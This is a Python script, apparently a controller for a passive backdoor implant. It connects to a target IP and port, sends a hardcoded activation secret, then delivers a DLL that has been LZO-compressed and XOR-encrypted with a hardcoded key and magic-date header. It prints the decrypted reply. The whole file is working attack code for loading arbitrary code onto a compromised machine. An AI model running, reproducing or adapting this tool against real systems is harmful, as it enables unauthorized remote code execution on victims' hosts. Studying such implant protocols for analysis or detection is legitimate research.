import malduck
import socket
import lzo
from random import randrange
from struct import pack, unpack_from

## Constants
## IP address of targeted machine
TARGET_IP = 'X.X.X.X'
## Port of targeted machine, where any program listens to TCP
TARGET_PORT = 8080
## Path to dll that exports function SetNtApiFunctions
PE_FILE_PATH = 'simpledll.dll'

## Forced constants
DEFLATE_LEVEL = 6
OEMCP = 0
MAGIC_DATE = 0x20160814
RANDOM_KEY = randrange(2**32)
PE_KEY = 0x1415CCE

ACTIVATION_SECRET = 'CB5766F7436E22509381CA605B98685C8966F16B'
ACTIVATION_SECRET = bytearray.fromhex(ACTIVATION_SECRET)

PRECOMPUTED_KEY = (
		'5C434846474C3F284EB64A4343433B4031E546C049584747454956FE4C51B369595A'
		'A5DB6DA082696E6C6D72654E74DC706969696166570B6CE66F7E6D6D6B6F7C247277'
		'D98F7F80CB0193C6A88F949293988B749A02968F8F8F878C7D31920C95A493939195'
		'A24A989DFFB5A5A6F127B9ECCEB5BAB8B9BEB19AC028BCB5B5B5ADB2A357B832BBCA'
		'B9B9B7BBC870BEC325DBCBCC174DDF12F4DBE0DEDFE4D7C0E64EE2DBDBDBD3D8C97D'
		'DE58E1F0DFDFDDE1EE96E4E94B01F1F23D7305381A010604050AFDE60C7408010101'
		'F9FEEFA3047E07160505030714BC0A0F7127171863992B5E40272C2A2B30230C329A'
		'2E2727271F2415C92AA42D3C2B2B292D3AE2')
PRECOMPUTED_KEY = bytearray.fromhex(PRECOMPUTED_KEY)

## Commbines the precomputed 256 B key with the small one
def expand_key(small_key: int):
	small_key = bytearray(pack('L', small_key))
	return(malduck.xor(small_key, PRECOMPUTED_KEY))


## Preparation (compression, encryption, metadata)
def prepare_payload(path: str):

	def Read_dll(fn: str):
		with open(fn,'rb') as f:
			return f.read()

	pe_file = Read_dll(path)
	len_pe = len(pe_file)

	compressed_pe = lzo.compress(pe_file)

	metadata = bytearray(51)
	metadata[16:20] = pack('l', len_pe)
	metadata[36:40] = pack('l', len_pe)

	once_encrypted = malduck.xor(expand_key(PE_KEY), metadata + compressed_pe)

	# once_encrypted = bytearray(0x34)+once_encrypted
	len_send_data = len(once_encrypted)+0x34
	len_payload = len_send_data-0x18

	not_encrypted_header = pack('L', len_payload) + pack('L', RANDOM_KEY)
	encrypted_header=bytearray(0x2c)

	encrypted_header[0x00:0x04] = pack('L', DEFLATE_LEVEL)
	encrypted_header[0x0C:0x10] = pack('L', MAGIC_DATE)
	encrypted_header[0x10:0x14] = pack('L', MAGIC_DATE)
	encrypted_header[0x14:0x18] = pack('L', len_send_data)
	encrypted_header[0x20:0x24] = pack('L', len_send_data)
	encrypted_header[0x28:0x2c] = pack('L', len_send_data)

	twice_encrypted = malduck.xor(expand_key(RANDOM_KEY), encrypted_header + once_encrypted)
	payload = not_encrypted_header + twice_encrypted
	return(payload)

## Network part
def send_and_receive(payload: bytes):
	s = socket.socket()
	try:
		s.connect((TARGET_IP, TARGET_PORT))
	except Exception as e:
		print(e)
		return(None)

	try:
		s.send(ACTIVATION_SECRET)
		received = s.recv(1000)
		s.send(payload)
		s.close()
	except Exception as e:
		print(e)
		s.close()
		return(None)
	return(received)

## Decrypt and show response
def parse_response(response: bytes):
	if len(response) < 16:
		print('Too short')
		return()
	print(f'Received message: {response.hex(" ")}')
	rsp_len = unpack_from('L', response[0:4])[0]
	rsp_key = unpack_from('L', response[4:8])[0]
	
	rsp_decrypted = malduck.xor(expand_key(rsp_key),response[8:])
	
	rsp_6 = unpack_from('L', rsp_decrypted[0:4])[0]
	rsp_tl = unpack_from('L', rsp_decrypted[4:8])[0]
	rsp_oemcp = unpack_from('L', rsp_decrypted[8:12])[0]
	rsp_20160814 = unpack_from('L', rsp_decrypted[12:16])[0]

	print(f'six:{rsp_6}, ThreadLocale:{rsp_tl}, OEMCP:{rsp_oemcp}, '
		f'MagicDate:{hex(rsp_20160814)}, Rest:{rsp_decrypted[16:].hex(" ")}')


payload = prepare_payload(PE_FILE_PATH)
response = send_and_receive(payload)
if response:
	parse_response(response)